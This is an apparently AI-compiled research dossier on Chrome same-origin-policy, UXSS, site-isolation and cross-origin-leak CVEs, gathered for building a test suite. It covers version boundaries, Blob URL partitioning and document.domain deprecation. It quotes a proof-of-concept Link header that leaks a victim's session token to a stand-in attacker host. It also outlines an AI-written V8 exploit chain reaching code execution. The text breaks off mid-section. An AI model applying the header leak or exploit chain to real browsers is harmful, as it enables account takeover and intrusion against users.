# Chrome / Chromium Same-Origin-Policy, UXSS & Cross-Origin Data Leak Dossier

**Compiled:** 2026-09-30
**Accuracy policy:** every version string in this document is quoted from the authoritative
CVE List V5 record published by the Chrome CNA, unless explicitly marked otherwise.
Anything I could not verify is marked **UNVERIFIED** rather than guessed.

---

## 0. Method, sources, and reachability caveats

Primary source used for all version boundaries:

- **CVE Project CVE List V5** (the official CNA-published records; Chrome is its own CNA):
  `https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/<year>/<bucket>/<CVE>.json`
  Example: <https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2025/4xxx/CVE-2025-4664.json>
  Enumerated via GitHub code search across `repo:CVEProject/cvelistV5`.

Secondary: GitHub Advisory Database (mirrors NVD), e.g. <https://github.com/advisories/GHSA-vxhm-55mv-5fhx>.

**Egress caveat — this materially limits some citations.** The research container blocked
direct fetches to: `chromereleases.googleblog.com`, `issues.chromium.org`, `nvd.nist.gov`,
`www.cve.org`, `chromestatus.com`, `developer.chrome.com`, `chromium.googlesource.com`,
`groups.google.com`, `www.cisa.gov`, `www.tenable.com`, and most security-news domains.
Reachable: `github.com`, `raw.githubusercontent.com`, plus a web-search index.

Consequence: Chrome Releases blog posts and Chromium issue-tracker entries are cited by
**URL** (correct and canonical, taken from the CVE record's own `references` array) but their
bodies were **not read first-hand**. Where a claim depends only on a blog body I have said so.

A note on CWE: **the Chrome CNA does not populate a CWE for these records** — the
`problemTypes` field carries Chrome's own taxonomy string (e.g. "Insufficient policy
enforcement"), and NVD/GHSA show CWE as unspecified (see
<https://github.com/advisories/GHSA-vxhm-55mv-5fhx>, CWE: not specified). Any CWE number
below is **my analytic mapping, not a cited assignment**, and is labelled as such.

---

## 1. CVE-2025-4664 — Loader / `Link` header referrer-policy cross-origin leak

**This is the flagship entry; everything here is first-hand verified.**

| Field | Value |
|---|---|
| CVE ID | CVE-2025-4664 |
| Component | **Loader** (Chrome's resource-loading stack) |
| Chrome bug class | **Insufficient policy enforcement** (Chrome's own taxonomy) |
| CWE | Not assigned by the CNA. My mapping: CWE-200 / CWE-668 (exposure of sensitive information to an unauthorized actor). **Mapping, not a citation.** |
| Affected boundary | **prior to 136.0.7103.113** |
| Fixed version string | **136.0.7103.113** (Linux); **136.0.7103.113 / .114** (Windows, Mac) |
| Chromium severity | **High** (per the CVE record's own text) |
| NVD/GHSA CVSS v3.1 | **4.3 MEDIUM** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N` |
| Chromium issue ID | **415810136** |
| CISA KEV | **Added 2025-05-15, then REMOVED** — see §1.4 |
| Reproducible client-side only? | **NO — requires a server-controlled HTTP response header on the subresource response.** See §1.3 |

### 1.1 Exact CVE text (verbatim, authoritative)

> "Insufficient policy enforcement in Loader in Google Chrome prior to 136.0.7103.113 allowed
> a remote attacker to leak cross-origin data via a crafted HTML page. (Chromium security
> severity: High)"

Source: <https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2025/4xxx/CVE-2025-4664.json>
(also mirrored at <https://github.com/advisories/GHSA-vxhm-55mv-5fhx>).

Note the split: **Chrome rated this High; NVD's CVSS is 4.3 Medium.** Both are correct
statements about different scales. Do not conflate them.

### 1.2 References from the CVE record (canonical URLs)

- Chrome Releases (Stable Desktop, 2025-05-14): <https://chromereleases.googleblog.com/2025/05/stable-channel-update-for-desktop_14.html> — *body not read first-hand (domain blocked)*
- Chromium issue: <https://issues.chromium.org/issues/415810136> — *not read first-hand (domain blocked); likely still restricted*
- Advisory publication date: **2025-05-14** (<https://github.com/advisories/GHSA-vxhm-55mv-5fhx>)
- Reporter: Vsevolod Kokorin (**@slonser_**), disclosed on X around 2025-05-05 — per press coverage indexed from <https://thehackernews.com/2025/05/new-chrome-vulnerability-enables-cross.html> and <https://www.helpnetsecurity.com/2025/05/16/cisa-recently-fixed-chrome-vulnerability-exploited-in-the-wild-cve-2025-4664/> (*bodies not read first-hand*)

The per-platform strings "136.0.7103.113/.114 for Windows and Mac, and 136.0.7103.113 for
Linux" come from the Chrome Releases post of 2025-05-14 as quoted by multiple independent
outlets; the **CVE record itself only states the single boundary `136.0.7103.113`.** Treat the
`.114` as the Windows/Mac rollout twin, not a separate fix level.

### 1.3 Mechanism — and the definitive answer on the server header

**What crosses the origin boundary:** the *full URL of the victim's document*, including its
query string, is delivered to an attacker-controlled origin in the `Referer` request header
of a `rel=preload` subresource request. Chrome's default policy
(`strict-origin-when-cross-origin`) should have truncated that to the bare origin. In an
OAuth/SSO flow the query string holds the authorization code or session token, so the leak is
an account takeover primitive.

**Root cause:** Chrome — uniquely among major browsers — parses the **HTTP `Link` response
header on subresource responses**, and honours a `referrerpolicy` parameter inside it. That
lets a *cross-origin subresource's own response* install a referrer policy that governs a
request attributed to the **embedding document**. The Loader applied the attacker-supplied
policy without checking that the party supplying it was entitled to relax the embedder's
policy — hence "insufficient policy enforcement".

**Verified answer: YES, it needs a server-controlled response header, and specifically on the
*subresource* response.** I confirmed this by reading the reference PoC source directly, not
from prose:

- `attacker.py`, route `/image`, sets exactly this response header:
  ```
  Link: <http://attacker.test:9000/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
  ```
  <https://raw.githubusercontent.com/amalmurali47/cve-2025-4664/main/attacker.py>
- `target.py` (the *victim* app) sets **no** `Link` header and **no** `Referrer-Policy` header.
  Its `/callback` route places the token in the URL as `session=<access_token>`.
  <https://raw.githubusercontent.com/amalmurali47/cve-2025-4664/main/target.py>
- `templates/profile.html` (the victim page) embeds
  `<img src="http://attacker.test:9000/image?cache={{ rnd }}">` with **no `referrerpolicy`
  attribute anywhere** — so the browser default applies.
  <https://raw.githubusercontent.com/amalmurali47/cve-2025-4664/main/templates/profile.html>

Chain: victim loads `example.com/...?session=TOKEN` → page embeds attacker's `<img>` →
attacker's image **response** carries the `Link:` header → vulnerable Chrome issues the
preload to `/log` under `unsafe-url` → `Referer` = full victim URL incl. `session=TOKEN` →
`/log` logs it. Repo root: <https://github.com/amalmurali47/cve-2025-4664>.

> **Correction of a widespread misconception.** A second public PoC
> (<https://github.com/speinador/CVE-2025-4664>) presents the bug as an HTML tag:
> `<link rel="preload" as="image" href="..." referrerpolicy="unsafe-url">`. **That is not the
> vulnerability.** A page has always been allowed to loosen the referrer policy on its *own*
> outgoing subresource requests; doing so leaks only that page's own URL, which the attacker
> already knows. The bug is specifically the **HTTP response header** on a *cross-origin
> subresource* overriding the *embedding document's* policy. If your test suite drives this
> from a `<link>` tag, it will "pass" on patched Chrome and prove nothing.

**Test-suite implication:** a pure `file://` or static-HTML harness **cannot** reproduce
CVE-2025-4664. You need (a) an HTTP origin for the "victim" page that carries a sensitive
query string, and (b) a *separate* origin whose server can emit an arbitrary `Link:` response
header on a subresource. Two distinct hostnames (hosts-file entries or ports are used in the
reference PoC) plus header control are mandatory.

### 1.4 Exploited in the wild? — the nuance that matters

- Google's release note said it was aware an exploit "exists in the wild" (2025-05-14).
- **CISA added CVE-2025-4664 to KEV on 2025-05-15**, remediation due 2025-06-05.
  <https://www.cisa.gov/news-events/alerts/2025/05/15/cisa-adds-three-known-exploited-vulnerabilities-catalog> (*body not read first-hand*)
- **CISA subsequently REMOVED it from KEV** (early June 2025), stating it had learned the CVE
  had not been exploited and there was insufficient evidence to keep it listed. Reported by
  <https://jericho.blog/2026/07/07/cisa-kevs-revolving-door/> and corroborated by KEV-tracking
  summaries. Consistent with the CVE record's own CISA ADP SSVC block, which now reads
  **Exploitation: none / "None observed"**
  (<https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2025/4xxx/CVE-2025-4664.json>).

**So: not currently in KEV.** The "actively exploited zero-day" framing in May-2025 press is
now superseded. The exact removal date is **UNVERIFIED** ("early June 2025" is as precise as I
can source).

---

## 2. "Insufficient policy enforcement in Loader" and Site Isolation, 2023–2026

All rows quoted from the CVE List V5 records. Bug IDs are the `issues.chromium.org` reference
in each record.

### 2.1 Loader — origin/policy-relevant (2023–2026)

| CVE | Chrome bug class | Affected boundary | Impact (verbatim fragment) | Sev | Bug ID |
|---|---|---|---|---|---|
| CVE-2025-4664 | Insufficient policy enforcement | prior to **136.0.7103.113** | leak cross-origin data via a crafted HTML page | High | 415810136 |
| CVE-2025-6556 | Insufficient policy enforcement | prior to **138.0.7204.49** | bypass content security policy via a crafted HTML page | Low | 40062462 |
| CVE-2026-11240 | Insufficient validation of untrusted input | prior to **149.0.7827.53** | compromised renderer → bypass site isolation | Low | 497030032 |
| CVE-2026-17664 | Insufficient validation of untrusted input | prior to **151.0.7922.72** | compromised renderer → leak cross-origin data | High | 500554346 |
| CVE-2026-17783 | Inappropriate implementation | prior to **151.0.7922.72** | leak cross-origin data via a crafted HTML page | Medium | 513532735 |
| CVE-2026-78942 | Incorrect reference resolution | prior to **152.0.7977.65** | bypass web origin policy via crafted network traffic | Medium | 502139081 |
| CVE-2026-79051 | Incorrect authorization | prior to **152.0.7977.65** | bypass web origin policy via a crafted HTML page | Medium | 513841856 |
| CVE-2026-87476 | Incorrect authorization | prior to **153.0.8010.36** | obtain sensitive information via a crafted HTML page | Medium | 506390077 |
| CVE-2026-87508 | Incorrect authorization | prior to **153.0.8010.36** | bypass web origin policy via a crafted HTML page | Medium | 513346220 |
| CVE-2026-87571 | Improper certificate validation | prior to **153.0.8010.36** | social engineering → bypass web origin policy via crafted network traffic | Low | 540046516 |
| CVE-2026-87575 | Incorrect authorization | prior to **153.0.8010.36** | social engineering → bypass system access restrictions | Low | 540013886 |

Memory-safety Loader bugs in range, for completeness (not SOP logic): CVE-2023-4429 (UAF,
prior to **116.0.5845.110**, bug ID UNVERIFIED), CVE-2024-6989 (UAF, prior to
**127.0.6533.72**, bug 349342289), CVE-2025-13720 (bad cast, prior to **143.0.7499.41**, bug
457818670), CVE-2026-17661 (UAF, prior to **151.0.7922.72**, bug 497451790).

**Note:** apart from CVE-2025-4664 and CVE-2025-6556, the exact phrase *"Insufficient policy
enforcement in Loader"* occurs **nowhere else** in the entire CVE List — only those two
records match. Chrome's taxonomy shifted to "Incorrect authorization" / "Insufficient
validation of untrusted input" during 2026.

### 2.2 Site Isolation (component label `Site Isolation` / `SiteIsolation`), 2023–2026

| CVE | Chrome bug class | Affected boundary | Impact | Sev | Bug ID |
|---|---|---|---|---|---|
| CVE-2023-5218 | Use after free | prior to **118.0.5993.70** | heap corruption | Critical | UNVERIFIED |
| CVE-2024-1671 | **Inappropriate implementation** | prior to **122.0.6261.57** | bypass content security policy | Medium | 41487933 |
| CVE-2024-3840 | **Insufficient policy enforcement** | prior to **124.0.6367.60** | bypass navigation restrictions | Medium | UNVERIFIED |
| CVE-2025-3066 | Use after free | prior to **135.0.7049.84** | heap corruption | High | UNVERIFIED |
| CVE-2026-7966 | Insufficient validation of untrusted input (`SiteIsolation`) | prior to **148.0.7778.96** | compromised renderer → bypass site isolation | Medium | 497341787 |
| CVE-2026-8010 | Insufficient validation of untrusted input (`SiteIsolation`) | prior to **148.0.7778.96** | compromised renderer → bypass site isolation | Low | 496624084 |
| CVE-2026-9903 | Insufficient validation of untrusted input | prior to **148.0.7778.216** | compromised renderer → bypass site isolation **via a crafted MHTML page** | High | 498783665 |
| CVE-2026-11174 | **Inappropriate implementation** | prior to **149.0.7827.53** | compromised renderer → bypass site isolation | Medium | 502348223 |
| CVE-2026-78903 | Incomplete cleanup (`SiteIsolation`) | prior to **152.0.7977.65** | compromised renderer → bypass site isolation | Medium | 518078552 |
| CVE-2026-78953 | Missing authorization (`SiteIsolation`) | prior to **152.0.7977.65** | compromised renderer → bypass site isolation **via a crafted PDF file** | Medium | 516665605 |
| CVE-2026-17779 | **Inappropriate implementation** | prior to **151.0.7922.72** | bypass site isolation via a crafted HTML page (**no renderer compromise required**) | Medium | 513478933 |
| CVE-2026-87606 | Missing authorization (`SiteIsolation`) | prior to **153.0.8010.36** | compromised renderer → bypass site isolation | Medium | 495933780 |

Exact-phrase findings: *"Inappropriate implementation in Site Isolation"* matches exactly
**four** records across all years — CVE-2022-3044 (prior to **105.0.5195.52**), CVE-2024-1671,
CVE-2026-11174, CVE-2026-17779. *"Insufficient policy enforcement in Site Isolation"* matches
**one**: CVE-2024-3840.

**CVE-2026-17779 is the most interesting of these for a client-side test suite** — it is the
only "Inappropriate implementation in Site Isolation" in the set that does **not** require a
pre-compromised renderer, i.e. reachable from a plain crafted HTML page.

### 2.3 Adjacent components that bypass site isolation / web origin policy (2025–2026)

Worth having in the suite because the boundary crossed is the same even though the component
label differs. All from CVE List V5.

| CVE | Component | Affected boundary | Impact | Sev | Bug ID |
|---|---|---|---|---|---|
| CVE-2025-13992 | Navigation and Loading | prior to **139.0.7258.66** | side-channel → bypass site isolation | Medium | 40095391 |
| CVE-2026-7945 | **COOP** | prior to **148.0.7778.96** | compromised renderer → bypass site isolation | Medium | 495802788 |
| CVE-2026-7959 | Navigation | prior to **148.0.7778.96** | compromised renderer → bypass site isolation | Medium | UNVERIFIED |
| CVE-2026-13024 | Navigation | prior to **149.0.7827.197** | compromised renderer → bypass site isolation | High | UNVERIFIED |
| CVE-2026-15130 | Navigation (**Insufficient policy enforcement**) | prior to **150.0.7871.115** | bypass site isolation via a crafted HTML page | High | UNVERIFIED |
| CVE-2026-15131 | Navigation (Inappropriate implementation) | prior to **150.0.7871.115** | bypass site isolation via a crafted HTML page | Medium | UNVERIFIED |
| CVE-2026-79031 | **Preload** | prior to **152.0.7977.65** | improper resource exposure → bypass site isolation | Medium | 503472696 |
| CVE-2026-79237 | Navigation (Incorrect authorization) | prior to **152.0.7977.65** | bypass **web origin policy** via a crafted HTML page | Medium | UNVERIFIED |
| CVE-2026-87433 | **FileAPI** | prior to **153.0.8010.36** | race → compromised renderer → bypass site isolation | Medium | 497574154 |
| CVE-2026-87499 | Network | prior to **153.0.8010.36** | compromised renderer → bypass site isolation | High | 553118043 |
| CVE-2026-93379 | **ORB** (Opaque Response Blocking) | prior to **153.0.8010.52** | bypass site isolation via a crafted HTML page | High | 560039872 |
| CVE-2026-95287 | Navigation (Missing authorization) | prior to **154.0.8037.57** | compromised renderer → bypass site isolation | Medium | 495529018 |
| CVE-2026-95301 | Extensions (Missing authorization) | prior to **154.0.8037.57** | compromised renderer → bypass site isolation | High | 540265100 |

**CVE-2026-93379 (ORB) and CVE-2026-15130 (Navigation) are the two highest-value
non-renderer-compromise, High-severity origin-boundary bugs in the recent set.**

---

## 3. Chrome/Chromium UXSS, 2023–2026 — the well *was* dry, then flooded

Method: exhaustive exact-phrase search of the whole CVE List for Chrome's UXSS wording
(`"inject arbitrary scripts or HTML"`, which covers both the bare form and the `(UXSS)`-tagged
form), cross-checked with a bare `"UXSS"` search scoped to `path:cves/2023` and
`path:cves/2025`.

### 3.1 The honest headline finding

- **2023: ZERO.** Both searches return 0 matches for Chrome.
- **2024: ONE, and it is not really UXSS** — CVE-2024-8907, "Insufficient data validation in
  Omnibox in Google Chrome on Android prior to **129.0.6668.58** … inject arbitrary scripts or
  HTML (**XSS**) via a crafted set of UI gestures. (Medium)". Chrome labels it XSS, not UXSS,
  and it needs UI gestures on Android.
- **2025: ZERO.**
- **2026: 44 records.**

So the premise "there are fewer than people think" is **correct for 2023–2025 — effectively
none.** But it inverts completely in 2026. I am reporting the counts as measured; I have
**not** verified *why* the 2026 spike happened, and I will not speculate in a document meant
to be cited. (It could be a reporting/taxonomy change, a bug-bounty push, or automated
discovery — **UNVERIFIED**.)

### 3.2 2026 UXSS records most relevant to a client-side SOP test suite

Filtered to: remote attacker, crafted HTML page, **no** extension install and **no** renderer
compromise required. All verbatim boundaries.

| CVE | Component | Affected boundary | Sev |
|---|---|---|---|
| CVE-2026-7939 | **SanitizerAPI** | prior to **148.0.7778.96** | Medium |
| CVE-2026-8539 | **SanitizerAPI** (Android; script injection) | prior to **148.0.7778.168** | **High** |
| CVE-2026-11122 | Keyboard | prior to **149.0.7827.53** | Medium |
| CVE-2026-11150 | **XML** | prior to **149.0.7827.53** | Medium |
| CVE-2026-11166 | **SVG** | prior to **149.0.7827.53** | Medium |
| CVE-2026-11169 | **XML** (via a crafted XML file) | prior to **149.0.7827.53** | Medium |
| CVE-2026-11186 | **CSS** | prior to **149.0.7827.53** | Medium |
| CVE-2026-12459 | Serial | prior to **149.0.7827.155** | **High** |
| CVE-2026-13836 | **CSS** | prior to **150.0.7871.47** | **High** |
| CVE-2026-13977 | **HTMLParser** | prior to **150.0.7871.47** | Medium |
| CVE-2026-14000 | **XML** | prior to **150.0.7871.47** | Medium |
| CVE-2026-14001 | Network | prior to **150.0.7871.47** | Medium |
| CVE-2026-14083 | **HTML** | prior to **150.0.7871.47** | Low |
| CVE-2026-14145 | **CSS** | prior to **150.0.7871.47** | Low |
| CVE-2026-14147 | **CSS** | prior to **150.0.7871.47** | Low |
| CVE-2026-15127 | WebGL | prior to **150.0.7871.115** | **High** |
| CVE-2026-15128 | Forms | prior to **150.0.7871.115** | **High** |
| CVE-2026-17728 | Extensions | prior to **151.0.7922.72** | Medium |
| CVE-2026-17734 | Autofill | prior to **151.0.7922.72** | Medium |
| CVE-2026-17797 | **CSS** | prior to **151.0.7922.72** | Medium |
| CVE-2026-17818 | Network | prior to **151.0.7922.72** | Medium |
| CVE-2026-17827 | **CSS** | prior to **151.0.7922.72** | Medium |
| CVE-2026-17845 | **CSS** | prior to **151.0.7922.72** | Medium |
| CVE-2026-17878 | **CSS** | prior to **151.0.7922.72** | Medium |
| CVE-2026-17962 | **Blink** | prior to **151.0.7922.72** | Low |

The recurring **CSS**, **XML**, **SanitizerAPI**, **HTMLParser** and **Blink** clusters are the
plausible pure-client-side candidates: markup/stylesheet parsing and sanitizer-bypass UXSS
generally need only a crafted HTML/XML/CSS document, no special response headers. **That
inference is mine — the CVE text does not state reproduction requirements, and I have no
first-hand PoC for any of them (UNVERIFIED).**

Other 2026 UXSS records requiring an extension, a renderer compromise, UI gestures, iOS, or
network position (listed for completeness, lower test-suite value): CVE-2026-5899
(History Navigation, prior to **147.0.7727.55**, UI gestures), CVE-2026-7941, CVE-2026-7953,
CVE-2026-7958 (ServiceWorker, extension), CVE-2026-8012 (MHTML, renderer), CVE-2026-8021,
CVE-2026-9971 (iOS), CVE-2026-10916 (DevTools, renderer, **High**), CVE-2026-11034,
CVE-2026-11157 (Accessibility, extension), CVE-2026-11205 (iOS, QR code), CVE-2026-11273,
CVE-2026-12463 (Views/Linux, renderer, **High**), CVE-2026-13812 (iOS), CVE-2026-13957
(Extensions), CVE-2026-14068 (iOS), CVE-2026-17724 (iOS), CVE-2026-17739 (Extensions),
CVE-2026-17761 (iOS).

### 3.3 Historical anchor

The canonical Chrome UXSS phrasing originates with records like CVE-2017-5124: "Incorrect
application of sandboxing in Blink in Google Chrome prior to **62.0.3202.62** allowed a remote
attacker to inject arbitrary scripts or HTML (UXSS) via a crafted MHTML page." (17 pre-2023
records total.)

---

## 4. Blob URL partitioning — what changed in Chrome 137

**Answer: Chrome 137 partitions Blob URL access by Storage Key for all uses *except*
top-level navigations, which remain partitioned by frame origin only.**

| Field | Value |
|---|---|
| Milestone | **Chrome 137** (stable ~2025-05-27) |
| Partition key | **Storage Key** = (top-level site, frame origin, `has-cross-site-ancestor` boolean) |
| Exception | **Top-level navigations** stay partitioned by **frame origin only** |
| Additional hardening | **`noopener` is now enforced** on renderer-initiated top-level navigations to blob URLs whose site is cross-site to the navigating top-level site (matches Safari) |
| Chrome Platform Status | <https://chromestatus.com/feature/5130361898795008> |
| Tracking bug | <https://crbug.com/40057646> |
| blink-dev intent | "Implement and Ship: Blob URL Partitioning: Fetching/Navigation" — <https://groups.google.com/a/chromium.org/g/blink-dev/c/erVBugcYwRc> |
| Enterprise escape hatch | **`PartitionedBlobUrlUsage`** policy — <https://chromeenterprise.google/policies/partitioned-blob-url-usage/> — offered **through Chrome 146**, then the old implementation is removed |

### Which spec change drove it

The driver is **Storage Key partitioning** (the same partitioning scheme already applied to
other storage APIs under Storage Partitioning / Total Cookie Protection). Three coordinated
spec PRs, verified first-hand:

- **`w3c/FileAPI#201` — "Partition Blob URL revocation by Storage Key"**, **merged
  2024-12-04**. Adds a storage-key check to `URL.revokeObjectURL`: revocation from a different
  partition **silently fails** rather than throwing. Verified at
  <https://github.com/w3c/FileAPI/pull/201>. Part of umbrella issue `w3c/FileAPI#153`
  ("Blob URL store partitioning").
- **`whatwg/fetch#1783`** — adds Storage Key partitioning checks to blob URL *fetches*.
- **`whatwg/html#10731`** — enforces `noopener` on cross-site blob URL *navigations*.

Cross-browser context (from the same PR's vendor-position section): **Gecko already
implemented** partitioning; **WebKit** partitions by top-level origin + frame origin and was
considering top-level *site*. So Chrome 137 was the laggard catching up, not the innovator.

Related CVE in the same area: **CVE-2026-87433** — "Race condition in **FileAPI** in Google
Chrome prior to **153.0.8010.36** … compromised renderer → bypass site isolation" (bug
497574154). Historical blob/origin precedent: **CVE-2018-18345** — "Incorrect handling of blob
URLS in Site Isolation in Google Chrome prior to **71.0.3578.80**".

**Not verified first-hand:** the Chrome 137 release-notes body
(<https://developer.chrome.com/release-notes/137>) and the chromestatus entry body — both
domains were blocked. The milestone-137 attribution and the "except top-level navigations"
carve-out are consistent across the Chrome 137 release notes, the Chrome 137 beta post, the
Chrome Enterprise policy page and the blink-dev intent, but I read them via a search index,
not directly.

---

## 5. `document.domain` deprecation — Chrome 115 CONFIRMED

**Your belief was correct: Chrome 115.**

| Field | Value |
|---|---|
| Milestone where setting `document.domain` stops relaxing the origin by default | **Chrome 115** |
| Behaviour | The setter **does not throw** (per spec) — it simply **ceases to have any effect** |
| Underlying mechanism | Documents are placed in **origin-keyed agent clusters by default** |
| Opt-out header | **`Origin-Agent-Cluster: ?0`** — requests a *site*-keyed agent cluster, restoring `document.domain` |
| Opt-out scope requirement | The header **must be sent on the main page *and* on every participating frame** |
| Enterprise policy | **`OriginAgentClusterDefaultEnabled`** — set to `false` to keep the old behaviour |
| Announcement blog | "Chrome disables modifying document.domain", published **2023-05-30** |
| Chrome Platform Status | <https://chromestatus.com/feature/5428079583297536> ("Deprecate the `document.domain` setter") |

Verified first-hand from the Chrome-for-Developers blog **source markdown** in Google's own
repository (reachable where the rendered site was not):
<https://raw.githubusercontent.com/GoogleChrome/developer.chrome.com/main/site/en/blog/document-domain-setter-deprecation/index.md>
(rendered: <https://developer.chrome.com/blog/document-domain-setter-deprecation>).

Rationale, quoted from that source: *"Setting `document.domain` opens up access to all other
sites hosted by that same service, which makes it easier for attackers to access your sites."*

### Important trap: the milestone slipped, and stale docs still say M106

The in-tree Chromium design doc still carries the **original, superseded** timeline —
M100 deprecation warnings, M101 second warning on cross-domain access, **"M106: Chrome will
disable document.domain by default"**, explicitly flagged there as *"the second milestone is
tentative."* Verified first-hand at
<https://raw.githubusercontent.com/chromium/chromium/main/docs/security/document-domain.md>
(rendered: <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/document-domain.md>).

**M106 was the plan; M115 was the ship.** Earlier blog
<https://developer.chrome.com/blog/immutable-document-domain> also predates the final
milestone. Cite 115, and expect to meet sources that say 106.

Relevant blink-dev intent: "Intent to Ship: Origin Isolation By Default / Deprecate
document.domain on stable" — <https://groups.google.com/a/chromium.org/g/blink-dev/c/nrLl0IxSxSI>
(*body not read first-hand*).

**Test-suite note:** `Origin-Agent-Cluster: ?0` is a **response header**, so any test that
exercises the opt-out path needs server header control on *both* the top document and the
iframe — it cannot be driven from static HTML.

---

## 6. Navigation API cross-origin information leaks

**Honest answer: I found no CVE attributable to the Navigation API** (the JS `navigation`
object / `navigate` events / `navigation.entries()`). Chrome's component label **`Navigation`
refers to the browser's navigation stack**, not the web-platform Navigation API, and I could
not confirm from the CVE text that any record concerns the JS API. Do not cite these as
"Navigation API" CVEs.

What does exist, in the `Navigation` component, verbatim from CVE List V5 — cross-origin
**leak** outcomes:

| CVE | Chrome bug class | Affected boundary | Sev |
|---|---|---|---|
| CVE-2020-36765 | Insufficient policy enforcement | prior to **85.0.4183.83** | Medium |
| CVE-2022-0108 | Inappropriate implementation | prior to **97.0.4692.71** | — |
| CVE-2022-0111 | Inappropriate implementation → **"incorrectly set origin"** | prior to **97.0.4692.71** | — |
| CVE-2026-5876 | **Side-channel information leakage** | prior to **147.0.7727.55** | Medium |
| CVE-2026-5918 | Inappropriate implementation (compromised renderer) | prior to **147.0.7727.55** | Low |
| CVE-2026-8562 | **Side-channel information leakage** | prior to **148.0.7778.168** | Medium |
| CVE-2026-87516 | **Observable discrepancy** | prior to **153.0.8010.36** | Medium |
| CVE-2026-87541 | Information leak → bypass site isolation (compromised renderer) | prior to **153.0.8010.36** | Medium |

Also in-scope adjacent: **CVE-2026-5899** — "Insufficient policy enforcement in **History
Navigation** in Google Chrome prior to **147.0.7727.55** … UI gestures → inject arbitrary
scripts or HTML (**UXSS**)" (Low). And **CVE-2026-87619** — "Observable discrepancy in
**Prefetch** … prior to **153.0.8010.36** … leak cross-origin data" (Low).

`CVE-2022-0111` ("incorrectly set origin") is the closest thing in the whole corpus to a
classic **origin-confusion** bug in navigation. Its mechanism is **UNVERIFIED** — the one-line
CVE text is all I could reach.

---

## 7. Broader cross-origin-data-leak corpus (context)

The exact phrase *"leak cross-origin data"* appears in **412** CVE List records. The
overwhelming majority of the 2026 entries are **graphics/GPU memory-disclosure** bugs
(`ANGLE`, `Dawn`, `Skia`, `WebGL`, `GPU` — "Uninitialized Use", "Out of bounds read", "Integer
overflow"), **not** SOP policy bugs. They leak pixels/memory across origins rather than
crossing a logical origin boundary, and are not reproducible as SOP tests.

Policy-/logic-flavoured cross-origin leaks worth noting outside the components already covered:

| CVE | Component | Affected boundary | Chrome bug class | Sev |
|---|---|---|---|---|
| CVE-2023-1223 | Autofill (Android) | prior to **111.0.5563.64** | Insufficient policy enforcement | Medium |
| CVE-2023-3736 | Custom Tabs (Android) | prior to **115.0.5790.98** | Inappropriate implementation | Medium |
| CVE-2023-5478 | Autofill | prior to **118.0.5993.70** | Inappropriate implementation | Low |
| CVE-2026-1504 | **Background Fetch API** | prior to **144.0.7559.110** | Inappropriate implementation | **High** |
| CVE-2026-3929 | **ResourceTiming** | prior to **146.0.7680.71** | Side-channel information leakage | Medium |
| CVE-2026-7954 | **Shared Storage** | prior to **148.0.7778.96** | Race (compromised renderer) | Medium |
| CVE-2026-8013 | **FedCM** | prior to **148.0.7778.96** | Insufficient validation of untrusted input | Low |
| CVE-2026-14082 | Storage | prior to **150.0.7871.47** | Race | Low |
| CVE-2026-79193 | Canvas | prior to **152.0.7977.65** | Information leak | Medium |
| CVE-2026-87619 | Prefetch | prior to **153.0.8010.36** | Observable discrepancy | Low |
| CVE-2026-93383 | Permissions | prior to **153.0.8010.52** | Information leak | Medium |

Historical policy-enforcement leaks useful as regression anchors: CVE-2021-38019 (**CORS**,
prior to **96.0.4664.45**), CVE-2022-1873 (**COOP**, prior to **102.0.5005.61**),
CVE-2021-21175 (Site isolation, prior to **89.0.4389.72**), CVE-2018-6150 (**ServiceWorker**
CORS, prior to **66.0.3359.117**), CVE-2018-6066 (Blink **CORS check missing in
ResourceFetcher/ResourceLoader**, prior to **65.0.3325.146**), CVE-2022-1146 (**Resource
Timing**, prior to **100.0.4896.60**), CVE-2021-21135 (**Performance API**, prior to
**88.0.4324.96**), CVE-2019-13697 (performance APIs, prior to **77.0.3865.120**).

---

## 8. The Hacktron AI blog post — FOUND

**It exists, and the real title differs from the one you gave me.**

| Field | Value |
|---|---|
| Actual title | **"Watching GPT-5.6 Sol Ultra Write a Chrome Exploit: Exploit Development as We Know It Is Dead"** |
| URL | <https://www.hacktron.ai/blog/watching-gpt-55-sol-ultra-write-a-chrome-exploit-exploit-development-as-we-know-it-is-over> |
| Published | mid-**July 2026** |
| Author | **s1r1us** (mohan) — <https://x.com/S1r1u5_/status/2077125665003098239> |

Two corrections to the premise: the model is **GPT-5.6** Sol Ultra, not GPT-5.5, and the title
ends **"Is Dead"**, not "is over". The URL slug still says `gpt-55` and `is-over` — the slug
was evidently not updated when the title was, which is why the title you had is close but not
exact.

**Reachability:** `www.hacktron.ai` was egress-blocked as stated, and I did not retry it.
Every mirror and all coverage domains (`cybersecuritynews.com`, `gbhackers.com`,
`cyberpress.org`, `cryptika.com`, `teamwin.in`, `blog.elhacker.net`, `x.com`,
`web.archive.org`) were **also blocked**. Everything below therefore comes from a **search
index's summaries of that coverage, not from reading the primary post.** Treat the figures as
well-corroborated across several independent outlets but **not first-hand verified**.

### 8.1 Target — note this is NOT an SOP/UXSS bug

| Field | Value |
|---|---|
| Target | **Chrome 149.0.7827.201**, **V8 14.9.207.35** |
| Bug class | **V8 memory corruption → sandbox escape → native code execution.** Not SOP, not UXSS, not a cross-origin leak. |
| CVE | **None identified.** The work started from *public V8 security-fix commits*, reconstructing exploitability from patches rather than targeting a named CVE. I found **no CVE ID** attributed to it — **UNVERIFIED / likely none**. |

Chain, as reported:

1. **Initial primitive** — **Maglev type confusion**: a *missing map check in V8's inlined
   array iterator* → `addrof` / `fakeobj`.
2. **In-sandbox R/W** — forged a fake `JSArray` → 4 GB cage read/write; widened to the full
   **1 TB V8 sandbox** by **corrupting `DataView` metadata**.
3. **Sandbox escape** — leaked native/binary/libc/stack addresses via a **signed-integer bug
   in string handling (`String::VisitFlat`)**.
4. **Native write** — **use-after-free on `NativeModule`** in Wasm's *background compiler*: a
   stale compiler operation touches attacker-controlled data after the freed `NativeModule`
   allocation is reclaimed. Yielded not an arbitrary write but a **constrained bitwise-OR** on
   chosen native addresses.
5. **PC control** — used that OR to **pivot the WebAssembly Code Pointer Table base** into
   controlled memory.
6. **Code execution** — hijacked **`posix_spawnp`** → launched **macOS Calculator**.

### 8.2 Harness / workflow structure — what you actually asked for

**Setup**

